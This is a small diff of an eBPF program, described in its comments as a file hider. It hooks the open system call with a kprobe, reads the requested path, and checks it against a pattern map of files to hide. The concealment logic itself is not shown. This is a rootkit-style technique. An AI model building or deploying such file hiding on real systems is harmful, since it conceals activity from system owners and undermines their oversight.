@@ -3,14 +3,14 @@
 #include <linux/fs.h>
 #include <linux/ktime.h>
 #define MAX 256
-// file hider that hooks into the sys_enter_open tracepoint to intercept open file sys call
-//checks the file name against a pattern map 
+// file hider that hooks into the sys-open  sys call
+//checks the file name against a patternap 
 //patterns need to be insterted 
-//if match is found file is" hidden" 
+
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 1024);
-    __type(key, char[256]);
+    __type(key, char[MAX]);
     __type(value, int);
 } patterns SEC(".maps");
 
@@ -19,7 +19,7 @@ SEC("kprobe/__x64_sys_open")
     char buf[MAX];
 
     // Copy the path from user space into our buffer
-    if (bpf_probe_read_str(buf, sizeof(buf), user_path) <= 0)
+    if (bpf_probe_read_user_str(buf, sizeof(buf), user_path) <= 0)
         return 1; 
 
     // Check if this path is in the pattern map to ignore 
